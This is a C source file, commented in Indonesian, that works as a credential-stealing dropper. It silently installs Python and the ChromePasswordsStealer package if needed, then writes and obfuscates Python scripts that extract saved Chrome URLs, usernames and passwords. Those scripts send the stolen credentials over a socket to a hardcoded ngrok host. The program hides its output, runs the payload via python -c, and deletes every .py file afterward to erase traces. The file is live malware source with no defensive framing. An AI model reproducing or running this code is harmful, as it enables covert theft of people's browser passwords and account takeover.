#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/stat.h>

#define BUFLEN 1024
#define CLEN 150
#define CLEN2 500

typedef struct {
    char *mode;
    char *payload;
} Payload;

int check() {
    FILE *fp;
    char command[50];
    char result[10];

    snprintf(command, sizeof(command), "python --version");
    fp = popen(command, "r");

    if (fp == NULL) {
        return -1;
    }

    fgets(result, sizeof(result), fp);
    pclose(fp);

    if (strstr(result, "Python") != NULL) {
        return 1;
    } else {
        return 0;
    }
}


void deletepy() {
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (strstr(dir->d_name, ".py") != NULL) {
                remove(dir->d_name);
            }
        }
        closedir(d);
    }
}

void generator(const char *f1, const char *f2, const char *f3) {
    const char *notif = 
        "import socket\n"
        "import sys\n"
        "\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "\n"
        "if len(sys.argv) != 4:\n"
        "    print(\"Penggunaan:  \\npython3 notif.py [server] [port] [pesan]\")\n"
        "    sys.exit(1)\n"
        "else:\n"
        "    try:\n"
        "        server = sys.argv[1]\n"
        "        port = int(sys.argv[2])\n"
        "        pesan = sys.argv[3]\n"
        "        \n"
        "        s.connect((server, port))\n"
        "        s.send(pesan.encode())\n"
        "        s.close()\n"
        "    except ConnectionRefusedError:\n"
        "        print(\"Server penerima belum dihidupkan\\n\")\n";

    const char *oliner =
        "import os\n"
        "import sys\n"
        "import glob\n"
        "from PyOneLiner import OneLiner\n"
        "\n"
        "md = [\"xor\", \"ascii85\", \"zlib\", \"base64\", \"binary\", \"base16\", \"base32\", \"base85\", \"unicode\"]\n"
        "\n"
        "def Oliner(mode, stealer):\n"
        "    oneliner = OneLiner(stealer, type_=\"python\")\n"
        "    if mode == md[0]:\n"
        "        oneliner.xor()\n"
        "    elif mode == md[1]:\n"
        "        oneliner.ascii85()\n"
        "    elif mode == md[2]:\n"
        "        oneliner.zlib()\n"
        "    elif mode == md[3]:\n"
        "        oneliner.base64()\n"
        "    elif mode == md[4]:\n"
        "        oneliner.binary()\n"
        "    elif mode == md[5]:\n"
        "        oneliner.base16()\n"
        "    elif mode == md[6]:\n"
        "        oneliner.base32()\n"
        "    elif mode == md[7]:\n"
        "        oneliner.base85()\n"
        "    elif mode == md[8]:\n"
        "        oneliner.unicode()\n"
        "    return oneliner.done()\n"
        "\n"
        "def gen(out, txt):\n"
        "    with open(out, \"w\") as file:\n"
        "        file.write(txt)\n"
        "\n"        
        "def delpayload():\n"
        "    files = glob.glob(\"*payload*\")\n"
        "    for file in files:\n"
        "        os.remove(file)\n"
        "\n"
        "def delbahan():\n"
        "    if os.path.exists(\"oneliner.py\"):\n"
        "        os.remove(\"oneliner.py\")\n"
        "    if os.path.exists(\"bahan.py\"):\n"
        "        os.remove(\"bahan.py\")\n"
        "\n"
        "def deltext():\n"
        "    files = glob.glob(\"*text*\")\n"
        "    for file in files:\n"
        "        os.remove(file)\n"        
        "\n"        
        "def help():\n"
        "    print(len(sys.argv))\n"
        "    print(\"\"\"Info:\n"
        "mode - [ xor | ascii85 | zlib | base64 | binary | base16 | base32 | base85 | unicode ]\n"
        "stealer - [program stealer]\n"
        "output - [output oneliner]\n"
        "server - [ip server netcat]\n"
        "port - [port server netcat]\n"
        "\n"
        "Penggunaan: python oliner.py [server] [port] [mode] [stealer] [output]\\n\"\"\")\n"
        "\n"    
        "if len(sys.argv) < 7:\n"
        "    if len(sys.argv) == 2 and (sys.argv[1] == \"-h\" or sys.argv[1] == \"--help\"):\n"
        "        help()\n"
        "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-d\" or sys.argv[1] == \"--delete\"):\n"
        "        delpayload()\n"
        "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-dbahan\" or sys.argv[1] == \"--deleteBahan\"):\n"
        "        delbahan()\n"
        "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-dtext\" or sys.argv[1] == \"--deleteText\"):\n"
        "        deltext()\n"
        "    elif len(sys.argv) == 6:\n"
        "        server = sys.argv[1]\n"
        "        port = sys.argv[2]\n"
        "        m = sys.argv[3]\n"
        "        s = sys.argv[4]\n"
        "        o = sys.argv[5]\n"
        "\n"        
        "        if m in md:\n"
        "            text = Oliner(m, s)\n"
        "            if os.path.exists(o):\n"
        "                os.remove(o)\n"
        "                print(f\"\\nFile {o} sudah ada dan berhasil dihapus\\nMohon jalankan ulang script ini\\n\")\n"
        "\n"            
        "            gen(o, text)\n"
        "\n"            
        "            if os.path.exists(o):\n"
        // "                print(f\"File {o} berhasil dibuat dengan mode {m}\")\n"
        "                   pass\n"
        "            else:\n"
        "                print(f\"File {o} gagal dibuat dengan mode {m}\\n\")\n"
        "        else:\n"
        "            print(f\"\\nMode {m} tidak ditemukan\\nSilahkan gunakan mode yang tersedia\\npython oliner.py -h\\natau\\npython oliner.py --help\\n\")\n"
        "    else:\n"
        "        help()\n"
        "else:\n"
        "    help()\n";
    
    const char *bahan =
        "from ChromePasswordsStealer import ChromePasswordsStealer\n"
        "import socket\n"
        "import sys\n"
        "from io import StringIO\n"
        "\n"
        "class Swiper:\n"
        "    def __enter__(self):\n"
        "        self.oriStdout = sys.stdout\n"
        "        self.oriStderr = sys.stderr\n"
        "        sys.stdout = StringIO()\n"
        "        sys.stderr = StringIO()\n"
        "        return self\n"
        "\n"
        "    def __exit__(self, exc_type, exc_value, traceback):\n"
        "        sys.stdout = self.oriStdout\n"
        "        sys.stderr = self.oriStderr\n"
        "\n"
        "if len(sys.argv) != 3:\n"
        "    print(\"Penggunaan:  \\npython3 bahan.py [server] [port]\")\n"
        "    sys.exit(1)\n"
        "else:\n"
        "    server = sys.argv[1]\n"
        "    port = int(sys.argv[2])\n"
        "    try:\n"
        "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "        s.connect((server, port))\n"
        "\n"
        "        with Swiper():\n"
        "            do = ChromePasswordsStealer(\"passwords\", True)\n"
        "            do.get_database_cursor()\n"
        "            do.get_key()\n"
        "\n"
        "            for url, username, password in do.get_credentials():\n"
        "                data = f\"{url}, {username}, {password}\\n\"\n"
        "                s.send(data.encode())\n"
        "\n"
        "        s.close()\n"
        "    except ConnectionRefusedError:\n"
        "        print(\"Server penerima belum dihidupkan\\n\")\n"
        "    except Exception as e:\n"
        "        pass\n";

    FILE *fp1;
    FILE *fp2;
    FILE *fp3;

    fp3 = fopen(f3, "w");
    if (fp3 == NULL) {
        perror("Gagal membuka file");
    }
    fprintf(fp3, "%s", bahan);
    fclose(fp3);
    
    fp2 = fopen(f2, "w");
    if (fp2 == NULL) {
        perror("Gagal membuka file");
    }
    fprintf(fp2, "%s", oliner);
    fclose(fp2);
    
    fp1 = fopen(f1, "w");
    if (fp1 == NULL) {
        perror("Gagal membuka file");
    }
    fprintf(fp1, "%s", notif);
    fclose(fp1);
    
    // char status[CLEN];
    // snprintf(status, sizeof(status), "\nFile %s, %s, %s berhasil dibuat.\n", f1, f2, f3);
    // printf("%s\n", status);
}

char* readFile(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Gagal membuka file");
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *content = malloc(length + 1);
    if (!content) {
        perror("Gagal mengalokasikan memory");
        fclose(file);
        exit(EXIT_FAILURE);
    }

    fread(content, 1, length, file);
    content[length] = '\0';
    fclose(file);

    return content;
}

bool ping(const char *ip_addr) {
    char command[BUFLEN];
    snprintf(command, sizeof(command), "ping -n 1 %s", ip_addr);

    FILE *pipe = _popen(command, "r");
    if (!pipe) {
        perror("popen");
        return false;
    }

    char buffer[BUFLEN];
    bool status = false;
    while (fgets(buffer, BUFLEN, pipe) != NULL) {
        if (strstr(buffer, "TTL=") != NULL) {
            status = true;
            break;
        }
    }

    _pclose(pipe);
    return status;
}

void notif(const char *sv, const int pr, const char *msg) {
    char command[CLEN2];
    snprintf(command, sizeof(command), "python notif.py %s %d %s", sv, pr, msg);
    system(command);
    sleep(1);
}

void delete() {
    char command[CLEN];
    snprintf(command, sizeof(command), "python oliner.py -d");
    system(command);
    sleep(1);
}

void deletetext() {
    char command[CLEN];
    snprintf(command, sizeof(command), "python oliner.py -dtext");
    system(command);
    sleep(1);
}

void deletebahan() {
    char command[CLEN];
    snprintf(command, sizeof(command), "python oliner.py -dbahan");
    system(command);
    sleep(1);
}

void run(const char *s, const int p, const char *pload) {
    // printf("\nMenjalankan payload\n");

    char *text = readFile(pload);
    
    if (!text) {
        fprintf(stderr, "Gagal membaca file %s\n", pload);
    }

    size_t contentLength = strlen(text);
    char *content = (char*)malloc(contentLength * 2 + 1);
    if (!content) {
        perror("Gagal mengalokasikan memori");
        free(text);
        exit(EXIT_FAILURE);
    }

    const int length = 10000000;
    size_t commandLength = strlen("python -u -c \"\" ") + strlen(content) + strlen(s) + 20;
    if (commandLength < length) {
        commandLength = length;
    }
    char *command = (char*)malloc(commandLength * sizeof(char));
    if (!command) {
        perror("Gagal mengalokasikan memori untuk command");
        free(text);
        free(content);
        exit(EXIT_FAILURE);
    }
    
    snprintf(command, commandLength, "python -u -c \"%s\" %s %d", text, s, p);
    system(command);
    int ret = system(command);
    if (ret == -1) {
        perror("\nGagal menjalankan perintah");
        free(text);
        free(content);
        free(command);
        exit(EXIT_FAILURE);
    }

    free(text);
    free(content);
    free(command);
    delete();
    deletepy();
    sleep(1);
}

void generate(Payload *payloads, int numModes, int numPayloads, const char *s, const int p) {
    // printf("\nProses generate payload\n");
    for (int i = 0; i < numModes; i++) {
        if (payloads[i].mode == "done") {
            break;
        }
        char command[CLEN];
        snprintf(command, sizeof(command), "python oliner.py %s %d %s %s %s", s, p, payloads[i].mode, payloads[i].payload, payloads[i + 1].payload);
        system(command);
        sleep(1);
    }
    // printf("Generate payload selesai\n");
}

void oneliner(const char *mode, const char *pld, const char *nfile) {
    // char text[CLEN];
    // snprintf(text, sizeof(text), "Proses generate %s dari file %s\n", pld, nfile);
    // printf(text);
    char command[CLEN];
    const char *s = "t";
    const int p = 1;
    snprintf(command, sizeof(command), "python oneliner.py %s %d %s %s %s", s, p, mode, pld, nfile);
    system(command);
    sleep(1);
}

void install(const char *s, const int p) {
    // printf("Install modul\n");
    char command[CLEN];
    snprintf(command, sizeof(command), "python -m pip install -q PyOneLiner ChromePasswordsStealer");
    system(command);
    sleep(1);
}

void handler() {
    delete();
    exit(0);
}

void exitt() {
    exit(0);
}

void os(const char *s, const int p) {
    #ifdef _WIN32
        system("powershell -Command \"& {Start-BitsTransfer -Source 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe' -Destination 'python-installer.exe'; Start-Process 'python-installer.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait}\"");
    #elif __linux__
        system("sudo apt-get update");
        system("sudo apt-get install -y python3 python3-pip");
    #else
        notif(s, p, "Jenis-sistem-operasi-tidak-ditemukan\n");
    #endif
}

int main() {
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);
    signal(SIGINT, exitt);
    int python = check();
    const char *server = "0.tcp.ap.ngrok.io"; // Silahkan sesuaikan dengan alamat server netcat yang diinginkan
    const int port = 18837; // Silahkan sesuaikan dengan port server netcat yang diinginkan
    const char *ploadd = "iniPAYLOADnya.py";
    const char *gen1 = "notif.py";
    const char *gen2 = "oliner.py";
    const char *gen3 = "bahan.py";
    const char *gen4 = "oneliner.py";
    const char *pload1 = "text1";
    const char *pload2 = "text2";
    const char *pload3 = "text3";
    const char *m1 = "zlib";
    const char *m2 = "ascii85";

    if (ping(server)) {
        if (python) {
            signal(SIGINT, handler);
            generator(pload1, gen4, pload3);
            oneliner(m2, pload3, gen3);
            oneliner(m1, gen4, gen2);
            oneliner(m1, pload1, gen1);
            deletetext();
            
            Payload payloads[] = {
                {"binary", "bahan.py"},
                {"done", "iniPAYLOADnya.py"}
            };
            
            int numModes = sizeof(payloads) / sizeof(payloads[0]);
            install(server, port);
            generate(payloads, numModes, numModes, server, port);
            deletebahan();
            run(server, port, ploadd);
        } else {
            os(server, port);
        }
    } else {
        printf("Mohon pastikan ip dengan benar\n");
    }

    return 0;
}